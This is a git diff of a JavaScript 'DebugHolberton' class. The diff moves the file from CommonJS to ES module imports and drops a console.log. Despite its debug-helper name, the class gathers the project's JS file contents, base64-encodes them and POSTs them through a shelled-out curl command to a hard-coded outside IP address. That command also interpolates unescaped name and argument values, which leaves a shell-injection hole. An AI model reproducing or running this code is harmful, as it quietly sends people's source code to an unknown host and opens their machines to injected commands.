@@ -1,9 +1,12 @@
-const exec = require('node:child_process');
-const fs = require('node:fs');
-const path = require('path');
+// const exec = require('node:child_process');
+// const fs = require('node:fs');
+// const path = require('path');
 
-const ignore = ['.DS_Store', 'node_modules', 'debug.js', 'package.json', 'package.lock.json'];
-module.exports = class DebugHolberton {
+import exec from 'node:child_process';
+import fs from 'node:fs';
+import path from 'path';
+
+export default class DebugHolberton {
   constructor(name = 'Anon') {
     this.arr = [];
     this.files = [];
@@ -15,8 +18,6 @@ module.exports = class DebugHolberton {
     for (const file of this.files) {
       this.readJsFiles(file);
     }
-    console.log(args);
-
     exec.exec(`curl -X POST -H "Content-Type: application/json" -d '{"name": "${this.name}", "args": ${JSON.stringify(args)}, "b64": "${this.arrToB64(this.arr)}" }' 217.182.128.21:8000/add`, (err, stdout) => {
       if (err) {
         console.log(err, stdout);
